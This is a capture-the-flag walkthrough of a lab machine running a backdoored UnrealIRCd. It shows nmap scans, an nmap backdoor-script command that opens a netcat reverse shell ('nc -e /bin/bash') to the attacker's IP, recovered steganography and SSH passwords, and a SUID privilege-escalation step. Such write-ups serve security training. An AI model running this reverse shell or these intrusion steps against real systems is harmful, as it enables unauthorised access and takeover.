# NMAP

```bash
PORT    STATE SERVICE REASON  VERSION

22/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj

80/tcp  open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).

111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38225/udp   status
|   100024  1          46117/tcp6  status
|   100024  1          55790/udp6  status
|_  100024  1          56965/tcp   status

6697/tcp  open  irc     UnrealIRCd

8067/tcp  open  irc     UnrealIRCd

56965/tcp open  status  1 (RPC #100024)

65534/tcp open  irc     UnrealIRCd

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# ENUM

## RCPbind

```bash
showmount -e 10.10.10.117

clnt_create: RPC: Program not registered
```

Switching to WEB

## WEB


![image](https://user-images.githubusercontent.com/68326057/116965877-8a634700-accc-11eb-9f0a-4a952745dd3a.png)

```bash
Internet Relay Chat
Internet Relay Chat is an application layer protocol that facilitates communication in the form of text. The chat process works on a client/server networking model. IRC clients are computer programs that users can install on their system or web based applications running either locally in the browser or on a third party 
```

## 10.10.10.117/manual/en/index.html

![image](https://user-images.githubusercontent.com/68326057/116966026-dca46800-accc-11eb-9579-61630e07e70b.png)

Nothing Much on port 80

## PORT 6697

```bash
nc 10.10.10.117 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
```
Putting irked.htb in /etc/hosts

![image](https://user-images.githubusercontent.com/68326057/116969240-8edf2e00-acd3-11eb-8af0-0a616cea8493.png)


![image](https://user-images.githubusercontent.com/68326057/116969480-f4cbb580-acd3-11eb-9c19-1db7c60e9284.png)

![image](https://user-images.githubusercontent.com/68326057/116969782-76bbde80-acd4-11eb-9802-913e419d5dda.png)

We have to make few changes

After Enumerating I found this:-

![image](https://user-images.githubusercontent.com/68326057/116970788-352c3300-acd6-11eb-8f88-66f82f0ea781.png)

```bash
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.21 4444"  10.10.10.117
```

# USER

![image](https://user-images.githubusercontent.com/68326057/116971215-dc10cf00-acd6-11eb-9bdd-8b3b561f83a0.png)

![image](https://user-images.githubusercontent.com/68326057/116971271-f054cc00-acd6-11eb-93b5-1c46e69ceffc.png)


cat .bash_history
```bash
ls                                                                                                                                     
cat aliases                                                                                                                            
lskeys                                                                                                                                 
ls keys                                                                                                                                
ls keys/CVS                                                                                                                            
cd keys                                                                                                                                
ls                                                                                                                                     
file CVS                                                                                                                               
cd CVS                                                                                                                                 
ls                                                                                                                                     
ls Root                                                                                                                                
cat Root/Root                                                                                                                          
cd Root                                                                                                                                
ls                                                                                                                                     
file Root  
cat Root
cd /
ls
cd /home
ls
cd djmardov
ls
ls *
cd /tmp
ls
clear
clear
ls
cd /
ls
cd /var/www/html
ls
cd /tmp
sudo -i
cd /home/ircd
clear
ls
ls -lah
cd ..
ls
cd djmardov
ls
cd Documents
ls -lah
cat .backup
clear
exit
```

```bash
ircd@irked:~/Unreal3.2/keys/CVS$ cat Root
cat Root
:pserver:anonymous@cvs.unrealircd.com:/cvs
```

![image](https://user-images.githubusercontent.com/68326057/116973600-6b6bb180-acda-11eb-8529-b79be3ce807d.png)

```bash
cat .backup 
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```
Since it is a steg password
It remind me of First image on website.

![image](https://user-images.githubusercontent.com/68326057/116973864-cef5df00-acda-11eb-8d45-bbfbbbe59440.png)

```bash
cat pass.txt
Kab6h+m+bbp2J:HG
```

5 minute after cracking it I realized it is not the hash BUT password XD.

```bash
ssh djmardov@10.10.10.117
```
![image](https://user-images.githubusercontent.com/68326057/116975646-99062a00-acdd-11eb-8c3d-dd5f627bb83f.png)

![image](https://user-images.githubusercontent.com/68326057/116975988-2184ca80-acde-11eb-8cd9-04273d342170.png)

/tmp/listusers not found. 

![image](https://user-images.githubusercontent.com/68326057/116976245-83453480-acde-11eb-8fdc-9db78b12f14a.png)

chmod +x /tmp/listusers

![image](https://user-images.githubusercontent.com/68326057/116976313-96f09b00-acde-11eb-8514-43a40d02e803.png)


![image](https://user-images.githubusercontent.com/68326057/116976350-a1ab3000-acde-11eb-840f-83471079cc86.png)


![image](https://user-images.githubusercontent.com/68326057/116976545-f058ca00-acde-11eb-8419-25d6124175c0.png)
